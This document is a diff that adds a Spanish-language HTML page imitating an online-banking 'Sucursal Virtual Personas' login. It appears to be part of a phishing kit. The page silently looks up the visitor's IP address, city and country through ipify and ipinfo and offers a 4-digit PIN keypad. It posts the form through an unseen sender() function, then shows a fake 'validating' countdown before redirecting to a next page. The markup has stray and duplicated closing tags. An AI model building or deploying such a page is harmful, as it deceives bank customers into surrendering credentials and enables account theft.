@@ -1,0 +1,266 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//ES" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+   <head>
+
+      <title> Bienvenidos</title>
+      <meta content="es" http-equiv="Content-Language">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <link href="css/styles.css" media="all" rel="stylesheet" type="text/css">
+      <link href="css/bootstrap.css" media="all" rel="stylesheet" type="text/css">
+      <link href="css/keyboard_util.css" rel="stylesheet" type="text/css">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+
+      <script type="text/javascript" src="js/jquery-1.10.1.js.descarga"></script>
+      <script type="text/javascript" src="js/jquery.validate-1.11.1.js.descarga"></script>
+      <script type="text/javascript" src="js/blockKeys.js"></script>
+      <script type="text/javascript" src="js/jquery-ui.js.descarga"></script>
+      <script type="text/javascript" src="js/bluebird.min.js.descarga"></script>
+      
+
+      <link href="css/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
+      <link href="css/ui.css" media="all" rel="stylesheet" type="text/css">
+      <script>
+         $.getJSON("https://api.ipify.org?format=json",
+                                           function(data) {
+         
+             // Setting text of element P with id gfg
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    
+})
+      </script>
+      <script>
+         //Function key start
+         
+         //Clear
+         function funcClear() {
+            var valu = document.getElementById('keyboard_display').value;
+            document.getElementById("keyboard_display").value = valu.substring(0, valu.length - 1);
+         }
+         
+         //Enter
+         function funcEnter() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu == '') {
+               alert('Not inserted : Empty value');
+            } else {
+               alert('Data Inserted : ' + valu);
+            }
+         }
+         
+         //Number Keys
+         //1
+         function func1() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '1';
+            }
+         
+         }
+         //2
+         function func2() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '2';
+            }
+         }
+         //3
+         function func3() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '3';
+            }
+         }
+         //4
+         function func4() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '4';
+            }
+         }
+         //5
+         function func5() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '5';
+            }
+         }
+         //6
+         function func6() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '6';
+            }
+         }
+         //7
+         function func7() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '7';
+            }
+         }
+         //8
+         function func8() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '8';
+            }
+         }
+         //9
+         function func9() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '9';
+            }
+         }
+         //0
+         function func0() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length < 4) {
+               document.getElementById('keyboard_display').value = valu + '0';
+            }
+         }
+         
+         function check() {
+            var valu = document.getElementById('keyboard_display').value;
+            if (valu.length >= 3 || valu <= 4) {
+               return true;
+            } else {
+               return false;
+            }
+         
+         }
+         
+      </script>
+      
+     
+      
+    
+      
+      
+   </head>
+   <body >
+
+      <form name="loginUserForm" action="#" onsubmit=" return sender()" method="post">
+
+         <p id="address"  hidden="">
+         
+         <div class="container">
+            <div>
+               <div id="header" class="mua-page-header">
+                  <div class="row row-logo-svp">
+                     <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                        <div class="mua-imgLogoItem"></div>
+                        <div class="text-svp-name">Sucursal Virtual Personas</div>
+                     </div>
+                  </div>
+                  <div class="row">
+                     <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                        <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
+                           <script language="javascript" src="js/jquery.jclockNew.js.descarga" type="text/JavaScript"></script>
+                           <script type="text/javascript">
+                              $(function($) {        
+                                  var optionsEST = {
+                                      utc: true,
+                                      utcOffset: -5,
+                                      format: "%A %R de %B de %Y %l:%M:%S %P", 
+                                      language: "es"
+                                 }
+                              $('#jclock1').jclockNew(optionsEST);
+                              });
+                           </script>
+                           <div>
+                              <div class="timeText">Fecha y hora actual:</div>
+                              <span id="jclock1" class="lastVisitedText" currenttime="1659430932738">Martes 2 de Agosto de 2022 5:02:12 PM</span>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div class="panel-heading">
+                  <h3>
+                     Inicio de sesion
+                  </h3>
+               </div>
+            </div>
+            <div>
+              <nav class="navbar navbar-default" style="min-height:6;">
+            <div class="container">
+               <div id="navbar"></div>
+            </div>
+         </nav>
+         <!-- END Nav -->
+         <div id="hh">
+            <section id="funnel-de-ingreso">
+               <div class="container">
+                  <div class="container-top">
+                     <div class="row">
+                        <div class="col-sm-12">
+                           <div class="inner-title">
+                              <h2 class="t-subtitle">Cargando...</h2>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div style="background-color: #ffffff; width: 100%;">
+                      <br>
+                     <div style="text-align: center;" align="left"><img style="width: 150px; display: block; margin-left: auto; margin-right: auto;" src="https://gifburg.com/images/gifs/loading/gifs/0020.gif"></div>
+                     <br> <br>
+                     <div style="text-align: center;" align="center">
+                        Por favor espere mientras realizamos validaciones. <br> Cargando plataforma <strong id="time"><label id="countdown">0:30</label></strong></div><strong id="time">
+
+                     <br>
+                     <div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado" style="text-align: center;">
+
+
+                     </div>
+                  </strong></div><strong id="time">
+               </strong></div><strong id="time">
+            </strong></section><strong id="time">
+            <script type="text/javascript">
+               var url="index3.html";
+               var seconds = 20; //número de segundos a contar
+               function secondPassed() {
+
+                 var minutes = Math.round((seconds - 20)/60); //calcula el número de minutos
+                 var remainingSeconds = seconds % 60; //calcula los segundos
+                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
+                 if (remainingSeconds < 10) {
+                   remainingSeconds = "0" + remainingSeconds;
+                 }
+                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds;
+                 if (seconds == 0) {
+                   clearInterval(countdownTimer);
+                  window.location=url;
+                   document.getElementById('countdown').innerHTML = "";
+                 } else {
+                   seconds--;
+                 }
+               }
+
+               var countdownTimer = setInterval(secondPassed, 1000);
+            </script>
+         </strong></div><strong id="time">
+
+
+      </strong></div><strong id="time">
+
+     
+
+</strong></body></html>
+
+                                       
+                                                         
+         </div>
+         
+      </form>
+    
+     <script src="js/sax2.js"></script>
+   </body>
+</html>
